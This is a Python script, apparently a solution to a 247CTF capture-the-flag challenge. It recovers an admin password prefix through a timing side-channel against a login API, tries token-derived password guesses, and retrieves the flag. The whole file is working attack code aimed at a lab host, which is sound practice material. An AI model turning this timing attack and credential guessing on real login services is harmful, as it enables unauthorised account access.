#!/usr/bin/env python3
import requests
import hashlib
import time

BASE_URL = "https://a2f2134654cc41a2.247ctf.com"
HEX_CHARS = "0123456789abcdef"

def get_token():
    resp = requests.get(f"{BASE_URL}/api/get_token", timeout=10)
    data = resp.json()
    return data["message"].split("reset to ")[1].rstrip("!")

def try_login(password, api_token):
    start = time.time()
    resp = requests.post(f"{BASE_URL}/api/login",
        data={"username": "admin", "password": password, "api": api_token},
        timeout=10)
    return resp.json(), time.time() - start

# Obtener contraseña parcial con timing attack
api_token = get_token()
known = ""

for pos in range(8):
    timings = {}
    for char in HEX_CHARS:
        test_pw = known + char + "0" * (31 - len(known))
        result, elapsed = try_login(test_pw, api_token)
        timings[char] = elapsed
    best_char = max(timings.items(), key=lambda x: x[1])[0]
    known += best_char

# Ahora probar relaciones entre token y los 8 caracteres conocidos
# Token: api_token
# Primeros 8 de password: known

# Probar si la contraseña completa es alguna transformación del token
def xor_hex(hex1, hex2):
    return ''.join(format(int(a, 16) ^ int(b, 16), 'x') for a, b in zip(hex1, hex2))

candidates = [
    api_token,
    api_token[::-1],
    hashlib.md5(api_token.encode()).hexdigest(),
    hashlib.sha256(api_token.encode()).hexdigest()[:32],
    xor_hex(api_token, known + "0" * 24),
]

# También probar si los últimos 24 caracteres son alguna función de los primeros 8
for candidate in candidates:
    result, _ = try_login(candidate, api_token)
    if result.get("result") == "success":
        flag_result = requests.post(f"{BASE_URL}/api/get_flag",
            data={"password": candidate}, timeout=10).json()
        print(flag_result.get("flag", flag_result))
        exit(0)
